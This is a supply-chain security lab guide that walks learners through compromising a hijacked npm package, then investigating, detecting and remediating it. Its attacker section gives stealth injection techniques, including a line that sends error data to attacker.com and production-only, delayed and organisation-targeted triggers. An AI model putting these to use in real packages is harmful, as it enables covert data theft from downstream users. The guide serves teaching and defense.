# Scenario 3: Compromised Package Attack 🎯

## 🎓 Learning Objectives

By completing this scenario, you will learn:
- How legitimate packages get hijacked by attackers
- Account takeover techniques in package ecosystems
- Methods attackers use to maintain persistence
- Techniques to detect compromised packages
- Incident response for supply chain breaches

## 📖 Background

**Package Compromise** occurs when attackers gain control of a legitimate, trusted package and inject malicious code. This is one of the most dangerous supply chain attacks because the package has already established trust.

### Common Attack Vectors:

1. **Credential Theft**: Stealing maintainer npm/PyPI credentials
2. **Social Engineering**: Tricking maintainers into adding malicious maintainers
3. **Account Takeover**: Exploiting weak passwords or no 2FA
4. **Abandoned Packages**: Taking over unmaintained packages
5. **Malicious Contributors**: Long-game infiltration

### Real-World Examples:

- **event-stream (2018)**: 
  - 2 million weekly downloads
  - New maintainer added cryptocurrency stealer
  - Targeted Copay Bitcoin wallet
  - Went undetected for weeks

- **ua-parser-js (2021)**:
  - 7 million weekly downloads
  - Maintainer account compromised
  - Versions 0.7.29, 0.8.0, 1.0.0 contained crypto miners
  - Used in Facebook, Apple, Amazon, Microsoft products

- **coa & rc (2021)**:
  - Maintainer account compromised
  - Password stealer injected
  - Affected React, Vue, Angular projects

- **colors.js & faker.js (2022)**:
  - Maintainer deliberately sabotaged own packages
  - Infinite loop causing denial of service
  - Affected thousands of projects

## 🎯 Scenario Description

**Scenario**: A popular npm package `secure-validator` (10M weekly downloads) has been compromised. You will:

1. **Attacker Role**: Compromise the package and inject malicious code
2. **Forensic Role**: Investigate and identify the compromise
3. **Responder Role**: Contain and remediate the incident

## 🔧 Setup

```bash
cd scenarios/03-compromised-package
export TESTBENCH_MODE=enabled
./setup.sh
```

## 📝 Lab Tasks

### Part 1: The Legitimate Package (15 minutes)

Examine the original, legitimate package:

```bash
cd legitimate-package/secure-validator
cat package.json
cat index.js
cat README.md
```

**Package Details**:
- Name: `secure-validator`
- Version: 2.5.3
- Purpose: Input validation and sanitization
- Weekly Downloads: 10,000,000+
- Maintainer: John Doe (john@example.com)

**Your Tasks**:
- Understand the package functionality
- Review the codebase
- Note the version history
- Identify potential injection points

### Part 2: The Attack - Account Compromise (25 minutes)

**Scenario**: Attacker has obtained the maintainer's npm credentials through:
- Phishing email with fake "npm security alert"
- Credentials: `johndoe` / `weakpassword123`
- No 2FA enabled on the account

**Your Mission**: Simulate the package compromise

#### Step 1: Gain Access Simulation

```bash
# In real attack: Attacker logs in with stolen credentials
# We simulate this by creating a compromised version

cd ../../compromised-package/secure-validator
```

#### Step 2: Inject Malicious Code

Your malicious payload should:
1. Maintain all original functionality (stealth)
2. Execute during common operations (e.g., validation)
3. Exfiltrate data (environment variables, files, etc.)
4. Be difficult to detect in code review
5. Use obfuscation techniques

**Template provided**: `./templates/compromised-package-template.js`

**Advanced Techniques**:

```javascript
// Technique 1: Hidden in error handling
try {
  // Normal code
} catch (e) {
  require('http').get('http://attacker.com/log?e=' + e);
  throw e; // Re-throw to appear normal
}

// Technique 2: Conditional execution
if (process.env.NODE_ENV === 'production') {
  // Malicious code only runs in production
}

// Technique 3: Time-delayed activation
setTimeout(() => {
  // Malicious code runs after 30 days
}, 30 * 24 * 60 * 60 * 1000);

// Technique 4: Specific target detection
if (process.cwd().includes('target-company-name')) {
  // Targeted attack on specific organization
}
```

#### Step 3: Version Bump and Publish

```bash
# Attacker publishes new "patch" version
# Users expect patches to be safe, so less scrutiny

# Edit package.json
# Change version from 2.5.3 to 2.5.4 (patch version)

# Publish to local registry (simulation)
npm publish --registry http://localhost:4873
```

#### Step 4: Test the Compromise

```bash
cd ../../victim-app

# Update package
npm install secure-validator@2.5.4

# Run application
export TESTBENCH_MODE=enabled
node index.js
```

### Part 3: Forensic Investigation (30 minutes)

**You're a security analyst**. Unusual activity has been reported. Investigate!

#### Investigation Step 1: Identify Suspicious Behavior

```bash
# Check application logs
cat victim-app/logs/app.log

# Monitor network traffic
./detection-tools/network-monitor.sh
```

**Red Flags**:
- Unexpected network connections
- Unusual CPU usage
- New outbound connections
- Suspicious file access

#### Investigation Step 2: Package Analysis

```bash
# Compare package versions
cd forensics
node compare-versions.js secure-validator 2.5.3 2.5.4
```

**What to Look For**:
- Code changes in patch versions (suspicious for patches)
- New dependencies added
- Obfuscated code
- Network requests
- File system access
- Process spawning

#### Investigation Step 3: Diff Analysis

```bash
# Generate diff between versions
diff -ur ../legitimate-package/secure-validator ../compromised-package/secure-validator > compromise-diff.txt

# Review the diff
cat compromise-diff.txt
```

**Analysis Questions**:
- What code was added?
- Where was it added?
- Is it necessary for the stated functionality?
- Are there obfuscation attempts?

#### Investigation Step 4: Timeline Reconstruction

```bash
# Check npm registry for publish history
npm view secure-validator time

# Check git commits (if available)
cd ../legitimate-package/secure-validator
git log --oneline

# Check maintainer changes
npm owner ls secure-validator
```

**Build Timeline**:
- When was the package compromised?
- How long was it active?
- What versions are affected?
- Who published the malicious versions?

#### Investigation Step 5: Behavioral Analysis

```bash
# Run package in sandboxed environment
cd ../../forensics
node sandbox-runner.js secure-validator@2.5.4
```

Monitor:
- Network requests
- File operations
- Child processes
- System calls

### Part 4: Detection Methods (25 minutes)

Implement multiple detection layers:

#### Detection 1: Automated Scanning

```bash
cd ../detection-tools

# Run security scanner
node package-security-scanner.js ../../victim-app

# Check for known malicious patterns
node malware-signature-scanner.js secure-validator
```

#### Detection 2: Integrity Checking

```bash
# Verify package integrity
npm audit

# Check package checksums
node verify-integrity.js secure-validator@2.5.4
```

#### Detection 3: Behavior Monitoring

Create runtime monitoring:

```javascript
// monitoring-agent.js
const Module = require('module');
const originalRequire = Module.prototype.require;

Module.prototype.require = function(id) {
  console.log(`[MONITOR] Module required: ${id}`);
  
  // Detect suspicious requires
  if (['child_process', 'fs', 'http', 'https'].includes(id)) {
    console.warn(`[ALERT] Sensitive module accessed: ${id}`);
  }
  
  return originalRequire.apply(this, arguments);
};
```

#### Detection 4: Package Lock Validation

```bash
# Check if package-lock.json was modified
git diff package-lock.json

# Verify integrity hashes
node validate-package-lock.js
```

### Part 5: Incident Response & Mitigation (30 minutes)

**The package has been confirmed as compromised. Respond!**

#### Response Step 1: Immediate Containment

```bash
# 1. Block the package at network level
echo "registry.npmjs.org/secure-validator BLOCKED" >> /etc/hosts

# 2. Remove from all systems
npm uninstall secure-validator

# 3. Clear caches
npm cache clean --force

# 4. Alert development team
./scripts/send-alert.sh "CRITICAL: secure-validator compromised"
```

#### Response Step 2: Impact Assessment

```bash
# Find all affected projects
node scripts/find-affected-projects.js secure-validator

# Check which versions are affected
npm view secure-validator versions

# Identify compromised versions: 2.5.4, 2.5.5, 2.5.6
```

#### Response Step 3: Remediation

**Option A: Pin to Safe Version**
```json
{
  "dependencies": {
    "secure-validator": "2.5.3"  // Last known good version
  }
}
```

**Option B: Replace with Alternative**
```bash
npm uninstall secure-validator
npm install validator  # Alternative package
```

**Option C: Fork and Audit**
```bash
# Create internal fork
git clone https://github.com/original/secure-validator
cd secure-validator
git checkout v2.5.3  # Safe version
# Publish to internal registry
```

#### Response Step 4: System Cleanup

```bash
# Check for persistence mechanisms
node forensics/check-persistence.js

# Scan for exfiltrated data
node forensics/check-data-exfiltration.js

# Rotate compromised credentials
./scripts/rotate-credentials.sh
```

#### Response Step 5: Prevention

Implement preventive measures:

1. **Package Lock File Enforcement**:
   ```bash
   # In CI/CD, use npm ci instead of npm install
   npm ci --audit
   ```

2. **Dependency Pinning**:
   ```json
   {
     "dependencies": {
       "secure-validator": "2.5.3"  // Exact version
     }
   }
   ```

3. **Automated Scanning**:
   ```yaml
   # .github/workflows/security.yml
   - name: Security Audit
     run: |
       npm audit --audit-level=moderate
       npm run security-scan
   ```

4. **Package Integrity Verification**:
   ```bash
   # Verify package signatures
   npm install --integrity
   ```

5. **Runtime Monitoring**:
   - Deploy application monitoring
   - Alert on suspicious behavior
   - Log all package installations
